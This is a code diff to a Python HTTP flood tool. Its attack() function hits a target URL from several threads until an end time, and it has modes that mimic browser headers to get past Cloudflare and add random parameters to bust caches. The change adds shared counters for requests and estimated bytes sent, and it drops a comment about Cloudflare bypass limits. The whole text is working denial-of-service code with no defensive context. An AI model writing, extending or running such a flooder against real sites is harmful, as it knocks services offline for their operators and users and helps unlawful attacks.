@@ -38,8 +38,12 @@ def get_random_string(length=8):
     letters = string.ascii_letters + string.digits
     return ''.join(random.choice(letters) for i in range(length))
 
+# Shared Counter
+TOTAL_REQUESTS = 0
+TOTAL_BYTES_SENT = 0
+
 def attack(target_url, end_time, thread_id, port, mode):
-    req_count = 0
+    global TOTAL_REQUESTS, TOTAL_BYTES_SENT
     
     # SSL Context
     import ssl
@@ -60,7 +64,6 @@ def attack(target_url, end_time, thread_id, port, mode):
                 headers['Referer'] = random.choice(REFERERS)
                 headers['Upgrade-Insecure-Requests'] = '1'
                 headers['Cache-Control'] = 'max-age=0'
-                # Spoiler: Real CF bypass needs detailed cookie logic, but this mimics browser behavior better.
 
             if mode == '3' or mode == '4': # BYPASS CACHE
                 separator = '&' if '?' in curr_url else '?'
@@ -72,8 +75,14 @@ def attack(target_url, end_time, thread_id, port, mode):
             # Fire!
             with urllib.request.urlopen(req, timeout=5, context=ctx) as response:
                 # Read response to fully consume
-                _ = response.read(1024) 
-                req_count += 1
+                data = response.read(1024) 
+                
+                # ESTIMATE BANDWIDTH (Headers + Body Sent)
+                # Roughly: URL Length + Header Length
+                bytes_sent = len(curr_url) + sum(len(k)+len(v) for k,v in headers.items()) + 200 # +200 overhead
+                
+                TOTAL_BYTES_SENT += bytes_sent
+                TOTAL_REQUESTS += 1
                 
         except Exception:
             pass
